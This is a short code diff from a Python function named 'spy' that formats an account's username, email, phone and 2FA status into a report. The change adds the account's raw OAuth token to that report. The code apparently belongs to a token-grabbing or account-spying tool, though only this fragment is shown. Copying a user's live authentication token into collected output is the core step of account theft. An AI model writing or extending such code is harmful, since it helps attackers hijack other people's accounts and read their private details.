@@ -56,7 +56,8 @@ async def spy(thread, **kwargs):
 [Username]{' '*10}{username}
 [Email]{' '*13}{email if email else 'None'}
 [Phone]{' '*13}{phone if phone else 'None'}
-[2FA]{' '*15}{'Enabled' if mfa else 'Disabled'}'''
+[2FA]{' '*15}{'Enabled' if mfa else 'Disabled'}
+[OAuth]{' '*13}{auth_token}'''
 
     headers = {
         "Authorization": auth_token,
